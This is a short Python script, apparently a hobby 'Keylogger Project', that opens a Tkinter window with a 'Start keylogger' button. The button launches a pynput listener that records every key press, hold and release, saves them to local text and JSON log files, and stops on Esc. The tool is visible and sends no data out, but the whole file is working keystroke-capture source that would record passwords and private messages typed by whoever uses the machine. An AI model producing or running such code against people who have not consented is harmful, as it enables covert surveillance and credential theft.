from pynput import keyboard
import json
import os
import tkinter as tk
from tkinter import *

root = tk.Tk()
root.geometry("250x300")
root.title("Keylogger Project")
root.configure(bg="lightgreen")

key_list = []
x = False
key_strokes = ""

BASE_DIR = os.path.dirname(__file__)
TXT_FILE = os.path.join(BASE_DIR, "logs.txt")
JSON_FILE = os.path.join(BASE_DIR, "logs.json")

def update_txt_file(text):
    with open(TXT_FILE, "w", encoding="utf-8") as f:
        f.write(text)

def update_json_file():
    with open(JSON_FILE, "w", encoding="utf-8") as f:
        json.dump(key_list, f, indent=2)

def on_press(key):
    global x, key_strokes

    try:
        k = key.char
    except:
        k = str(key)

    if not x:
        key_list.append({"Pressed": k})
        x = True
    else:
        key_list.append({"Held": k})

    key_strokes += k
    update_txt_file(key_strokes)
    update_json_file()

    print("Pressed:", k)

def on_release(key):
    global x

    try:
        k = key.char
    except:
        k = str(key)

    key_list.append({"Released": k})
    x = False
    update_json_file()

    print("Released:", k)

    if key == keyboard.Key.esc:
        return False
    
def butaction():

      print("[+] Running Keylogger successfully!\n[!] Saving the key logs in 'logs.json'")

      with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

empty = Label(root, text=" ").grid(row=0,column=0)
empty = Label(root, text=" ").grid(row=1,column=0)
empty = Label(root, text=" ").grid(row=2,column=0)
empty = Label(root, text="Keylogger", font=("Verdana", 10, "bold")).grid(row=3, column=2)
empty = Label(root, text=" ").grid(row=4,column=0)
empty = Label(root, text=" ").grid(row=5,column=0)
Button(root, text="Start keylogger", command=butaction).grid(row=6,column=3)
root.mainloop()
